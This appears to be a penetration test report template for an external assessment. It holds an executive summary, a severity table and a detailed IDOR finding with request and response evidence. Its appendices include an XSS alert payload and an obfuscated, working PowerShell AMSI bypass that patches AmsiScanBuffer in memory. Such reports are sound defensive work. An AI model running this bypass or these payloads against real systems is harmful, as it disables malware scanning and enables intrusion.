---
title: "Security Assessment Findings Report"
author: ["pentester@youremailaddress.com"]
date: "2025-01-01"
subject: "Black-box penetration test"
keywords: [audit, assessment, pentest, report]
subtitle: "Company Name"
lang: "en"
titlepage: true
titlepage-color: "820AD1"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
---
# Security Assessment Findings Report

## Confidentiality Statement

This document is the exclusive property of Company Name and Pentester Name.
This document contains proprietary and confidential information. Duplication,
redistribution, or use, in whole or in part, in any form, requires consent of
both Company Name and Pentester Name.

Company Name may share this document with auditors under non-disclosure
agreements to demonstrate penetration test requirement compliance.

## Disclaimer

A penetration test is considered a snapshot in time. The findings and
recommendations reflect the information gathered during the assessment and not
any changes or modifications made outside of that period.

Time-limited engagements do not allow for a full evaluation of all security
controls. The assessment was prioritized to identify the weakest security controls an
attacker would exploit. It is recommended to conduct similar assessments on an
annual basis by internal or third-party assessors to ensure the continued
success of the controls.

## Contact Information

| Name      | Title                  | Contact Information |
|-------------|------------------------|--------------------|
| Pentester Name | Pentester | Email: username@domain.com |

## Assessment Overview

The objective of this assessment was to evaluate the security posture of
Company Name's network and systems. All testing performed is based on the NIST
SP 800-115 Technical Guide to Information Security Testing and Assessment,
OWASP Testing Guide (v4), and customized testing frameworks.

Phases of penetration testing activities include:

- Planning and Preparation: customer requirements, scope, and rules of
  engagement were defined.
- Discovery: information gathering, network mapping, and service
  enumeration.
- Attack: exploitation of vulnerabilities and weaknesses.
- Reporting: documentation of findings, including risk ratings and
  recommendations.

## Assessment Components

### External Penetration Test

An external penetration test emulates the role of an attacker operating from
outside the organization's network perimeter. An engineer will analyze exposed
services such as web applications, email servers, VPNs, and other
internet-facing systems to identify potential vulnerabilities and
misconfigurations. The assessment includes reconnaissance, service enumeration,
vulnerability exploitation, and web-based attacks such as SQL injection,
authentication bypass, subdomain takeover, and cross-site scripting (XSS). The
engineer will attempt to gain unauthorized access to external services, extract
sensitive information, and, where applicable, pivot into the internal
environment through exposed attack paths like VPN credential reuse or web
shells.

## Finding Severity Ratings

The following table defines levels of severity and corresponding CVSS score
range that are used throughout the document to assess vulnerability and risk
impact.

| Severity | CVSS V3 Score Range | Description                            |
|----------|-----------------|------------------------------------------------|
| Critical | 9.0 - 10.0 | Exploitation is straightforward and usually results in system-level compromise. It is advised to form a plan of action and patch immediately. |
| High | 7.0 - 8.9 | Exploitation is more difficult but could cause elevated privileges and potentially a loss of data or downtime. It is advised to form a plan of action and patch as soon as possible. |
| Medium | 4.0 - 6.9 | Vulnerabilities exist but are not exploitable or require extra steps such as social engineering. It is advised to form a plan of action and patch after high-priority issues have been resolved. |
| Low | 0.1 - 3.9 | Vulnerabilities are non-exploitable but would reduce an organization’s attack surface. It is advised to form a plan of action and patch during the next maintenance window. |
| Informational | 0.0 | No vulnerability exists. Additional information is provided regarding items noticed during testing, strong controls, and additional documentation. |

## Risk Factors

Risk is defined as the potential for loss or damage when a threat exploits a
vulnerability. The risk rating is based on the likelihood of exploitation and
the impact of a successful attack. The risk rating is determined by the
combination of the severity rating and the likelihood of exploitation.

### Likelihood of Exploitation

Likelihood measures the potential of a vulnerability being exploited. Ratings
are given based on the difficulty of the attack, the available tools, attacker
skill level, and client environment.

### Impact

Impact measures the potential vulnerability’s effect on operations, including
confidentiality, integrity, and availability of client systems and/or data,
reputational harm, and financial loss.

## Scope

| Assessment | Details |
|------------|--------------|
| External Penetration Test | 1.2.3.0/24 |

### Scope Exclusions

Per client request, the following attacks were not performed during the tests:

- Denial of Service (DoS)
- Phishing/Social Engineering

All other attacks not specified above were permitted by Company Name.

### Client Allowances

Company Name provided the following allowances:

- IP address white listing


# Executive Summary

The external network security assessment of Company Name was conducted to evaluate the resilience of its internet-facing infrastructure against real-world attacks. The pentester performed extensive reconnaissance, vulnerability scanning, exploitation attempts, and credential-based attacks against the public IP addresses and services in scope. The goal was to identify weaknesses that could be leveraged by a malicious actor to gain unauthorized access to Company Name's internal environment or sensitive information.

## Scoping and Time Limitations

Scoping during the engagement did not permit denial of service or social engineering across all testing components.

Time limitations were in place for testing. External penetration testing was permitted for ten
(10) business days.

## Assessment Overview

From an external perspective, the pentester identified several critical and high-risk vulnerabilities, including:

- Exposure of outdated and vulnerable software across multiple public-facing services (Finding EPT-001, Critical Risk).
- Weak SSL/TLS configurations permitting potential downgrade attacks and exposure to known cryptographic exploits (Finding EPT-004, High Risk).
- Authentication portals vulnerable to password spraying attacks due to lack of account lockout protections (Finding EPT-007, High Risk).
- Public VPN portal lacking multifactor authentication (MFA), allowing the use of compromised credentials for internal access (Finding EPT-009, Critical Risk).

Beyond technical findings, the pentester assessed procedural and configuration
risks, such as the absence of external monitoring for anomalous login attempts
and poor segmentation between externally accessible systems and internal
critical assets.

## Attack Path and Business Impact

Through a successful password spraying campaign, the pentester discovered valid credentials for multiple user accounts. Due to the absence of multifactor authentication on the VPN endpoint, the pentester used the compromised credentials to establish remote access into Company Name's internal network.

Once inside, the pentester enumerated internal services and identified several unsecured management portals (Finding EPT-012, Medium Risk). Exploiting the lack of internal segmentation, the pentester was able to escalate access to servers containing sensitive business data, including internal documentation and client records.

This chain of exploitation demonstrates the potential for an external attacker to:

- Breach perimeter defenses.
- Establish persistent internal access.
- Move laterally across the internal network.
- Exfiltrate sensitive corporate and client data.

The successful compromise of internal assets from an external starting point represents a critical risk to the organization’s confidentiality, integrity, and availability.

For a detailed walkthrough of the specific attack chain leading to privileged access, including timelines, tactics, techniques, and procedures (TTPs), please refer to Finding EPT-025.

## Recommendations Overview

To mitigate the identified risks, Company Name should prioritize:

- Immediate patching and hardening of all external services.
- Implementation of multifactor authentication on all external authentication portals, particularly VPN access.
- Enforcement of account lockout policies to mitigate password spraying.
- Regular external penetration testing and continuous perimeter monitoring.
- Network segmentation to limit lateral movement opportunities after initial
  access.

## Key Strengths and Weaknesses

The following identifies the key strengths identified during the assessment:

1. Minimal Attack Surface:
The majority of Company Name's public-facing systems were limited to essential services only, reducing unnecessary exposure.
2. Timely Patching on Certain Assets:
Several critical systems, such as the main corporate website and key APIs, were found to be updated and not vulnerable to common publicly disclosed exploits.
3. Limited Service Banner Disclosure:
Many external services did not reveal detailed version or technology information through service banners, which helps reduce reconnaissance opportunities for attackers.
4. Use of SSL/TLS Encryption:
Despite some configuration weaknesses, most external services were
appropriately protected with SSL/TLS, ensuring that data in transit was
encrypted.

The following identifies the key weaknesses identified during the assessment:

1. Vulnerable Outdated Services:
Several externally exposed applications were running outdated software versions containing critical security vulnerabilities (Finding EPT-001).
2. Weak Authentication Protections:
External authentication portals lacked account lockout mechanisms and multifactor authentication, making them susceptible to credential attacks (Findings EPT-007 and EPT-009).
3. Insufficient Monitoring and Alerting:
There appeared to be no effective detection or alerting in place for abnormal login attempts, which delayed the identification of potential credential-based attacks.
4. Lack of Segmentation Post-VPN Access:
After gaining VPN access, the internal network segmentation was insufficient to restrict lateral movement between sensitive internal systems (Finding EPT-012).
5. Exposure of Sensitive Administrative Interfaces:
Several management interfaces were accessible either directly from the internet
or internally without sufficient access controls.

# Vulnerability Summary & Report Card

The following tables illustrate the vulnerabilities found by impact and
recommended remediations:

## External Penetration Test Findings

| Critical | High | Moderate | Low | Informational |
| :----------: | :----------: | :----------:  | :----------:| :----------:     |
| 3        | 2    | 1        | 0   | 0             |

| Finding | Severity | Recommendation |
|----|--|-------|
| EPT-001: Vulnerable Outdated Services | Critical | Patch all outdated software and services to the latest secure versions. |
| EPT-009: VPN Portal Without MFA | Critical | Enforce multifactor authentication (MFA) on all external access points, especially VPN portals. |
| EPT-025: Path to Privileged Access | Critical | Implement defense-in-depth controls, privileged access management (PAM), and enhanced monitoring to detect lateral movement. |
| EPT-007: Password Spraying Vulnerability | High | Implement account lockout policies and monitor for abnormal authentication attempts. |
| EPT-004: Weak SSL/TLS Configurations | High | Update SSL/TLS settings to disable weak ciphers and enforce strong encryption protocols (e.g., TLS 1.2/1.3). |
| EPT-012: Lack of Internal Network Segmentation | Medium | Segment internal networks to isolate sensitive systems and reduce lateral movement risk. |

# Technical Findings

## External Penetration Test Findings

### EPT-010: Insecure Direct Object Reference (IDOR) in User Profile API

|         |         |
|---------|------------------------------------------|
| **Description**  | The application is vulnerable to Insecure Direct Object Reference (IDOR). This issue allows an authenticated user to modify the URL parameter `user_id` to access other users' data without proper access control validation. |
| **Risk**         | **Likelihood**: Medium – IDOR vulnerabilities are common in web applications where access control is improperly implemented. |
|                  | **Impact**: High – Attackers can potentially access sensitive user data, modify user profiles, or escalate privileges. |
| **System**       | Web Application (User Profile Management Section) |
| **Tools Used**   | Burp Suite, Manual URL Parameter Manipulation |
| **References**   | OWASP Top 10: A01 - Broken Access Control |
|                  | OWASP Web Security Testing Guide - IDOR |

#### Description

The web application at <https://app.companyname.com> exposes a User Profile API that improperly authorizes access to user-specific data.
By modifying the user_id parameter in API requests, an unauthenticated user can retrieve sensitive information belonging to other users, such as full name, email address, phone number, and billing information.

This vulnerability allows attackers to access and enumerate arbitrary user
accounts without needing valid credentials.

#### Impact

Exploitation of this vulnerability could result in:

- Unauthorized access to personally identifiable information (PII).
- Violation of data protection regulations (e.g., GDPR, CCPA).
- Reputational damage if customer data is leaked.
- Potential legal and financial penalties.

Given the sensitive nature of the exposed data, this vulnerability is rated
High severity.

#### Evidence

A request to the User Profile API was observed:

Request (normal)

```http
GET /api/v1/user/profile?user_id=1001 HTTP/1.1
Host: app.companyname.com
Authorization: Bearer eyJhbGciOi...
```

Response

```json
{
  "user_id": 1001,
  "full_name": "Alice Johnson",
  "email": "<alice@example.com>",
  "phone": "+1-555-0123",
  "billing_address": "123 Main St, Anytown, USA"
}
```

By modifying the user_id parameter to 1002:

Request (manipulated)

```http
GET /api/v1/user/profile?user_id=1002 HTTP/1.1
Host: app.companyname.com
Authorization: Bearer eyJhbGciOi...
```

Response (unauthorized data disclosure)

```json
{
  "user_id": 1002,
  "full_name": "Bob Smith",
  "email": "<bob@example.com>",
  "phone": "+1-555-0456",
  "billing_address": "456 Second St, Othertown, USA"
}
```

No server-side authorization checks were performed to verify that the
authenticated user should access the requested user_id.

#### Steps to Reproduce

1. Log in to the web application as a regular user (e.g., test account).
1. Intercept a request to the User Profile API using a proxy tool (e.g., Burp Suite, OWASP ZAP).
1. Locate the user_id parameter in the URL:
    /api/v1/user/profile?user_id=1001
1. Modify the user_id parameter to another value (e.g., user_id=1002).
1. Forward the modified request.
1. Observe that the server returns personal information for the user with ID 1002 without any authorization error.

#### Recommendation

- Implement proper object-level authorization checks on the server-side to ensure users can only access their own resources.
- Use the authenticated user context (e.g., user session or token) to determine the user identity, instead of accepting a user-controlled parameter.
- Regularly test APIs for broken access control vulnerabilities using automated and manual security testing.
- Consider adopting secure development practices following OWASP guidelines, such as OWASP API Security Top 10.

# Appendices

## Appendix A - XSS

```html
<img src=x onerror="alert(`XSS`)" />
```

## Appendix B - AMSI Bypass

```powershell
#Rasta-mouses Amsi-Scan-Buffer patch \n
$rMcz964 = @"
using System;
using System.Runtime.InteropServices;
public class rMcz964 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr mA6vvXG2gnE, string ieENc);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr vaNXj5HNlEOD3XgSnt, UIntPtr sxhlJr6z, uint mao4q8QAA0zlG2h7GLMr, out uint QVXz261d);
}
"@

Add-Type $rMcz964

$Y0yA_UgH4Gkz67LrZQ = [rMcz964]::LoadLibrary("$([cHAR](97)+[cHAr]([byTe]0x6d)+[CHAr](93+22)+
[cHar](105*60/60)+[CHaR]([byTe]0x2e)+
[char]([BYtE]0x64)+[ChAr]([byte]0x6c)+
[ChAr]([ByTE]0x6c))")
$mWDeJB6EsdcJ = [rMcz964]::GetProcAddress($Y0yA_UgH4Gkz67LrZQ, "$(('ÂmsíScànBùf'+'fèr').nOrmalIzE([ChaR]([ByTe]0x46)+
[ChAr]([BYtE]0x6f)+[chaR]([bYTe]0x72)+
[cHaR](62+47)+[cHar](68*10/10)) -replace [ChAR](92)+[CHaR](112)+
[CHAr]([bYtE]0x7b)+[ChaR]([BYte]0x4d)+
[ChAR]([bytE]0x6e)+[Char]([byTe]0x7d))")
$p = 0
[rMcz964]::VirtualProtect($mWDeJB6EsdcJ, [uint32]5, 0x40, [ref]$p)
$vE1Iff8Gzn9g0 = "0xB8"
$MgwqWZpEpIMYZPWNWB = "0x57"
$X09HKwAXFudI3631 = "0x00"
$uapsU = "0x07"
$LwfMDQvO6mU = "0x80"
$AIOLsvcJzMgayqwQ = "0xC3"
$C7yuLc = [Byte[]] ($vE1Iff8Gzn9g0,$MgwqWZpEpIMYZPWNWB,$X09HKwAXFudI3631,$uapsU,
+$LwfMDQvO6mU,+$AIOLsvcJzMgayqwQ)
[System.Runtime.InteropServices.Marshal]::Copy($C7yuLc, 0, $mWDeJB6EsdcJ, 6)
```
